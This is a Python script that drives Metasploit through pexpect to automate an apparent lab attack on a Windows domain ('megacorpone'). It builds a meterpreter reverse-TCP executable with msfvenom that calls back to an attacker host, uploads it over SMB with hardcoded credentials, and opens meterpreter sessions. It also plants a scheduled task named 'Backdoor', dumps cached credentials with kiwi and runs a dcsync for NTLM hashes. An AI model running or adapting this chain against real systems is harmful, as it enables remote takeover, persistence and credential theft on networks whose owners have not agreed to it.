#!/usr/bin/python3

import pexpect
import os
import logging
import time

LOG_FILE = 'msfscript_log.txt'

# Configure logging
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def log_info(message):
    logging.info(message)
    print(message)

def log_error(message):
    logging.error(message)
    print(f'[ERROR] {message}')

#def generate_msfshell_exe(process):
    #filename = 'msfshell.exe'

 #   if os.path.exists(filename):
        #print("File already exists")
#    else:
        #msfvenom_command = f'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.22.117.100 LPORT=4444 -f exe > {filename}'
        #execute_command(msfvenom_command, process)
        #print("File not found - creating")
#addition
def execute_command(command, process):
    process.sendline(command)
    process.expect_exact(pexpect.TIMEOUT)

print ("INITIALISING")
print ("WELCOME")

#log_info('Generating msfshell.exe...')
#generate_msfshell_exe(process)
        
print("Starting msfconsole")
msf_script = pexpect.spawn('msfconsole', encoding='utf-8')

msf_script.expect('msf6', timeout=120)
print ("SKIPPING SMB LOGIN - TIME CONSTRAINTS")
print ("RUNNING RESOURCE1.RC")

command = 'resource resource1.rc'
log_info('resource1.rc')
msf_script.sendline(command)
msf_script.expect('auxiliary', timeout=120)
log_info('RESOURCE1.RC COMPLETE - BEGINNING SMBCLIENT')
log_error('Timeout occurred while waiting for .expect prompt.')

# Generate msfshell.exe
filename = 'msfshell.exe'
command = f"execute -f python -o -c 'import os; os.system(\"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.22.117.100 LPORT=4444 -f exe > {filename}\")'"
log_info('Generating msfshell.exe...')
execute_command(command, msf_script)
log_info("File generation complete.")


#SMB client put shell.exe
command = 'smbclient //172.22.117.20/C$ -U megacorpone/tstark'
log_info('smbclient')
log_error('Timeout occurred while waiting for .expect prompt.')
msf_script.sendline(command)
time.sleep(5)
log_info('ENTERING PASSWORD')
log_error('Timeout occurred while waiting for .expect prompt.')
msf_script.sendline('Password!')
msf_script.expect('smb')
log_info('PUTTING .EXE ON TARGET MACHINE')
log_error('Timeout occurred while waiting for .expect prompt.')
msf_script.sendline('put msfshell.exe')
log_info('SUCCESS')
log_error('Timeout occurred while waiting for .expect prompt.')
msf_script.expect('smb')
msf_script.sendline('exit')
msf_script.expect('auxiliary')
log_info('exiting')
log_error('Timeout occurred while waiting for .expect prompt.')

command = 'resource resource2.rc'
log_info('resource2.rc')
log_error('Timeout occurred while waiting for .expect prompt.')
msf_script.sendline(command)
msf_script.expect_exact('meterpreter >', timeout=240)
log_info('Meterpreter session active, send to background')
log_error('Timeout occurred while waiting for .expect prompt.')
msf_script.sendline('background')
msf_script.expect('auxiliary')
        
command = 'resource resource3.rc'
log_info('resource3.rc')
log_error('Timeout occurred while waiting for .expect prompt.')
#github up to here
msf_script.sendline(command)
msf_script.expect_exact('meterpreter >', timeout=240)
log_info('windows shell')
log_error('Timeout occurred while waiting for .expect prompt.')
msf_script.sendline('shell')
msf_script.expect('\windows\system32>', timeout=120)
log_info('schtasks creation')
log_error('Timeout occurred while waiting for .expect prompt.')
msf_script.sendline('schtasks /create /f /tn Backdoor /SC ONCE /ST 00:00 /TR "C:\shell.exe"')
msf_script.expect('\windows\system32>')
log_info('SCHEDULED TASK CREATED SUCCESSFULLY - EXITING')
log_error('Timeout occurred while waiting for .expect prompt.')
msf_script.sendline('exit')
msf_script.expect('meterpreter')
log_info('exiting shell and meterpreter and continuing')
log_error('Timeout occurred while waiting for .expect prompt.')
msf_script.sendline('exit')
msf_script.expect('exploit')


command = 'resource resource4.rc'
log_info('resource4.rc')
log_error('Timeout occurred while waiting for .expect prompt.')
msf_script.sendline(command)
msf_script.expect_exact('meterpreter >', timeout=240)
log_info('starting kiwi')
log_error('Timeout occurred while waiting for .expect prompt.')
msf_script.sendline('load kiwi')
msf_script.expect('meterpreter')
log_info('kiwi lsadump')
log_error('Timeout occurred while waiting for .expect prompt.')
msf_script.sendline('kiwi_cmd lsadump::cache')
msf_script.expect_exact('meterpreter >', timeout=240)
log_info('returning to msfconsole')
log_error('Timeout occurred while waiting for .expect prompt.')
msf_script.sendline('exit')
msf_script.expect('exploit')

command = 'resource resource5.rc'
log_info('resource5.rc')
log_error('Timeout occurred while waiting for .expect prompt.')
msf_script.sendline(command)
msf_script.expect_exact('meterpreter >', timeout=240)
log_info('request sysinfo')
log_error('Timeout occurred while waiting for .expect prompt.')
msf_script.sendline('sysinfo')
msf_script.expect_exact('meterpreter >', timeout=240)
log_info('Requesting shell')
log_error('Timeout occurred while waiting for .expect prompt.')
msf_script.sendline('shell')
msf_script.expect('system32')
log_info('Requesting net users')
log_error('Timeout occurred while waiting for .expect prompt.')
msf_script.sendline('net users')
msf_script.expect('system32')
log_info('exiting and returning to meterpreter')
log_error('Timeout occurred while waiting for .expect prompt.')
msf_script.sendline('exit')
msf_script.expect('meterpreter')
log_info('starting kiwi')
log_error('Timeout occurred while waiting for .expect prompt.')
msf_script.sendline('load kiwi')
msf_script.expect('meterpreter')
log_info('attempting dcsync')
log_error('Timeout occurred while waiting for .expect prompt.')
msf_script.sendline('dcsync_ntlm cdanvers')
msf_script.expect('meterpreter')
log_info('completed, exiting script')
log_error('Timeout occurred while waiting for .expect prompt.')
msf_script.sendline('exit')
msf_script.sendline('exit -y')

msf_script.close()